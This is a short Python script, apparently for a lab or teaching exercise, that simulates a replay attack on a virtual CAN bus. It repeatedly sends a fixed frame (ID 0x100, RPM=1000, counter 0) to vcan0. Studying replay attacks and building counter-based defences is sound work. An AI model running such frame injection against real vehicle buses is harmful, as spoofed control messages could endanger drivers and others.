import can
import time


CAN_ID = 0x100

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)


print("=" * 60)
print(" CAN REPLAY ATTACK SIMULATOR")
print("=" * 60)
print()
print("Target CAN ID : 0x100")
print("Replay frame  : RPM=1000")
print("Counter       : 0")
print()
print("The same CAN frame will be transmitted repeatedly.")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()


message = can.Message(
    arbitration_id=CAN_ID,
    data=[0x03, 0xE8, 0x00],
    is_extended_id=False
)


try:

    while True:

        bus.send(message)

        print(
            "REPLAY -> "
            f"ID=0x{CAN_ID:03X} "
            f"DATA={message.data.hex(' ')}"
        )

        time.sleep(1)

except KeyboardInterrupt:

    print()
    print("Replay attack stopped.")

finally:

    bus.shutdown()
